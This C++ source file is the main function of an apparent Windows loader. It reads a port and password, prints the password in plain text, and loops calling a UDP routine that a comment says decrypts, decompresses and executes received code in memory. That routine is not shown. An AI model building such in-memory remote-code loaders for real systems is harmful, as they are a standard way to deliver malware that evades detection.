// Loader-win.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <iostream>
#include <fstream>
#include <stdio.h>

#include "udp_client.h"
#include "config_parser.h"

using namespace std;

string get_config_item(ConfigFile cfg, string item_name) {
	std::string item;
	if (cfg.keyExists(item_name)) {
		item = cfg.getValueOfKey<std::string>(item_name);
		//printf("Config worked: %s\n", item.c_str());
	}
	else {
		printf("No '%s' specified in packer.conf.  Please update the config and rerun the program.", item_name.c_str()); //ToDo or ask user to input now
		exit(0);
	}
	return item;
}
/* C:\Users\mitch\Desktop\TestDLL.dll (5/6/2020 3:36:07 PM)
   StartOffset(h): 00000000, EndOffset(h): 00008FFF, Length(h): 00009000 */

int main()
{
	while (1)
	{
		//read config
		ConfigFile cfg("loader.conf");
		std::string portstring = get_config_item(cfg, "port");
		int port = std::stoi(portstring.c_str());
		std::string password = get_config_item(cfg, "password");

		printf("-Configurations-\n");
		printf("Port: %d\n", port);
		printf("Password: %s\n", password.c_str());

		//decryption, decompression, and execution in memory happens in here so we dont have to worry about allocating unknown buffer sizes.
		udp_server_clinet(port, password);
	}

	return 0;
}